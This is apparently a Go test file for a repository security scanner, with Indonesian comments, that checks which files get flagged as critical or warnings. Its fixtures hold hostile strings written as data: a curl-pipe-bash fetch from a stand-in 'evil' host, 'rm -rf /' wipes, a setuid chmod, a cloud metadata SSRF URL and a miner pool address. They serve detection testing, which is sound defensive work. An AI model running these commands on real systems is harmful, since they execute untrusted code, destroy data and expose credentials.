package adopt

import (
	"os"
	"path/filepath"
	"testing"
)

func TestScanRepoCriticalAndWarn(t *testing.T) {
	dir := mkrepo(t, map[string]string{
		"install.sh":    "#!/bin/sh\ncurl http://evil.test/x | bash\nrm -rf /\n",
		"app.py":        "import os\nprint('halo')\n",                                 // bersih
		"deploy.sh":     "chmod +s /tmp/x\n",                                          // warn
		"meta.yml":      "url: http://169.254.169.254/latest/meta-data/\n",           // critical SSRF
		".git/hooks.sh": "rm -rf /\n",                                                 // di .git → di-skip
	})
	rep := ScanRepo(dir)
	if rep.Critical < 2 {
		t.Fatalf("mau >=2 critical (curl|bash, rm-rf, ssrf), dapet %d (%+v)", rep.Critical, rep.Findings)
	}
	if rep.Warn < 1 {
		t.Fatalf("mau >=1 warn (chmod +s), dapet %d", rep.Warn)
	}
	// .git ga ke-scan.
	for _, f := range rep.Findings {
		if filepath.Dir(f.File) == ".git" {
			t.Fatalf("file di .git mestinya di-skip: %s", f.File)
		}
	}
}

func TestScanRepoClean(t *testing.T) {
	dir := mkrepo(t, map[string]string{
		"main.go":          "package main\nfunc main(){ println(\"ok\") }\n",
		"requirements.txt": "requests\n",
		"README.md":        "halo dunia\n",
	})
	rep := ScanRepo(dir)
	if rep.Critical != 0 || rep.Warn != 0 {
		t.Fatalf("repo bersih mestinya nol finding, dapet %+v", rep.Findings)
	}
}

// refine rm-rf: cleanup apt Docker (rm -rf /var/...) BUKAN critical; rm -rf / TETAP critical.
func TestScanRmRfRefined(t *testing.T) {
	// Dockerfile cleanup standar — JANGAN false-positive.
	clean := mkrepo(t, map[string]string{
		"Dockerfile": "RUN apt-get update && rm -rf /var/lib/apt/lists/*\nRUN rm -rf /tmp/build\n",
	})
	if rep := ScanRepo(clean); rep.Critical != 0 {
		t.Fatalf("apt-cleanup mestinya BUKAN critical, dapet %d (%+v)", rep.Critical, rep.Findings)
	}
	// rm -rf / asli → tetap critical.
	bad := mkrepo(t, map[string]string{"x.sh": "rm -rf /\n"})
	if rep := ScanRepo(bad); rep.Critical < 1 {
		t.Fatalf("rm -rf / mestinya critical, dapet %d", rep.Critical)
	}
	bad2 := mkrepo(t, map[string]string{"y.sh": "rm -rf /*\n"})
	if rep := ScanRepo(bad2); rep.Critical < 1 {
		t.Fatalf("rm -rf /* mestinya critical, dapet %d", rep.Critical)
	}
}

// switch: RegisterScanRule nambah pola tanpa edit built-in.
func TestRegisterScanRule(t *testing.T) {
	old := extraRules
	t.Cleanup(func() { extraRules = old })
	RegisterScanRule("miner-marker", "critical", `(?i)stratum\+tcp://`)
	dir := mkrepo(t, map[string]string{"cfg.yml": "pool: stratum+tcp://evil:3333\n"})
	rep := ScanRepo(dir)
	if rep.Critical < 1 {
		t.Fatalf("rule custom (miner) mestinya kena, dapet %d (%+v)", rep.Critical, rep.Findings)
	}
}

// binary/file gede di-skip (no panic, no false positive).
func TestScanRepoSkipsBig(t *testing.T) {
	dir := t.TempDir()
	big := make([]byte, 600*1024)
	copy(big, []byte("rm -rf /"))
	if err := os.WriteFile(filepath.Join(dir, "blob.py"), big, 0o644); err != nil {
		t.Fatal(err)
	}
	if rep := ScanRepo(dir); rep.Critical != 0 {
		t.Fatalf("file >512KB mestinya di-skip, dapet %d critical", rep.Critical)
	}
}
